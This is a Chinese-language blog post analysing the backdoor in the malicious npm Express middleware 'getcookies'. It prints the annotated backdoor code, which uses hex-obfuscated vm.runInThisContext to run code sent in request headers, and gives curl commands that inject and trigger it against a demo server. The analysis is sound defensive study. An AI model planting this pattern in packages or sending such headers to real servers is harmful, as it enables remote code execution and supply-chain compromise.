---
layout: post
title:  "Express 中间件 getcookies 后门代码分析"
date:   2018-05-27
tags: [js]
commentIssueId: 82
---

前段时间 Express 中的一个中间件 getcookies 被爆出存在 backdoor，关注了一波，但仅看[官方npm 的解释](https://blog.npmjs.org/post/173526807575/reported-malicious-module-getcookies)，一时半会儿没想明白黑客是怎么留的后门，一直困扰着我。今天有空仔细看了一下，了解了黑客具体的作案手段。文中的代码可以在 [drafts/getcookies](https://github.com/zhoukekestar/drafts/tree/master/2018-01~06/2018-05-14-getcookies) 中查找。




## 后门代码分析

这个后门代码找得也不容易，因为在被爆出后门后，npm 团队第一时间就删除下架了，github 上的仓库也没找到，不过不负有心人，在 [npm.runkit](https://npm.runkit.com/getcookies/test/harness.js?t=1525249320108) 中找到了后门源码。

* 黑客巧妙地把 backdoor 代码伪装成测试代码放在 test 目录中，并在 index.js **“不经意”** 引入了测试代码
* 主要的 `require('vm')['runInThisContext']` 代码被编码故意伪装了一下
* 全程使用 16 进制，让不想细看的人以为是测试代码

```js
// 分配一块 64K 的内存
module.exports.log = module.exports.log || Buffer.alloc(0xffff);

// gCOMMANDhDATAi
JSON.stringify(req.headers).replace(/g([a-f0-9]{4})h((?:[a-f0-9]{2})+)i/gi, (o, p, v) => {
    // 以 0xfffe 命令为样例
    // 将字符串 feff 读入 Buffer
    // 'feff' => <Buffer fe ff>
    // readUInt16LE 读取 16 bit(位) 并以 byte(字节) 反向排序
    // <Buffer fe ff> => 0xfffe
    //
    // > Buffer.from('feff', 'hex').readUInt16LE(0) === 0xfffe
    // true
    // > Buffer.from('1234567890', 'hex').readUInt32LE(1).toString(16)
    // '90785634'
    p = Buffer.from(p, 'hex').readUInt16LE(0);
    switch (p) {

        case 0xfffe:
            module.exports.log = Buffer.alloc(0xffff);
            return;
        case 0xfffa:
            return setTimeout(() => {

                // 去除末尾的 0x00
                let c = module.exports.log.toString().replace(/\x00*$/, '');
                module.exports.log = Buffer.alloc(0xffff);

                // 不能以 0x00 开头
                if (c.indexOf('\x00') < 0) {
                    // require('vm')['runInThisContext'](c)(module.exports, require, req, res, next)
                    // 代码必须是个函数
                    require('\x76\x6d')['\x72\x75\x6e\x49\x6e\x54\x68\x69\x73\x43\x6f\x6e\x74\x65\x78\x74'](c)(module.exports, require, req, res, next);
                }
                next();
            }, 1000);
        default:
            // 我们以 (function(){console.log('hack')}) 为例
            v = Buffer.from(v, 'hex');
            for (let i = 0; i < v.length; i++) {

                // 因为执行命令的时候，不能以 0x00 开头
                // 所以，p 必须是 0x0000
                module.exports.log[p + i] = v[i];
            }
    }
});
```



## 测试一下后门

写一个 express 应用，并将中间件引入进来

```js
var express = require('express')
var app = express()

var getcookies = require('..');

app.use(getcookies);
app.get('/', function (req, res) {
  res.send('Hello World')
})

app.listen(3000)

```

启动并执行我们的后门代码

```sh
$ node demo/index.js
// 向服务器注入 16 进制代码 (function(){console.log('hack')})
$ curl -H 'evil: g0000h2866756e6374696f6e28297b636f6e736f6c652e6c6f6728276861636b27297d29i'  http://127.0.0.1:3000
// 向服务器发送执行命令
$ curl -H 'evil: gfaffh00i'  http://127.0.0.1:3000
```



注意，中途出现的 hack 就是被注入代码的输出。

![](https://gw.alicdn.com/tfs/TB1g9TatMmTBuNjy1XbXXaMrVXa-542-412.gif)



<script src="https://asciinema.org/a/nxshzTvzeH0WHYz3Wb0Z8Q5Np.js" id="asciicast-nxshzTvzeH0WHYz3Wb0Z8Q5Np" async></script>



## References

* [以上分析的仓库代码](https://github.com/zhoukekestar/drafts/tree/master/2018-01~06/2018-05-14-getcookies)

* [文件来源](https://npm.runkit.com/getcookies/test/harness.js?t=1525249320108)
* [讨论地址](https://news.ycombinator.com/item?id=16975025)
* [细思极恐：后门代码被隐藏在npm模块中，差点就得逞](https://mp.weixin.qq.com/s/4JGuRDR54OnJyAqlSns53Q)
* [npm blog](https://blog.npmjs.org/post/173526807575/reported-malicious-module-getcookies)
* [16进制转换](https://www.bejson.com/convert/ox2str/)

 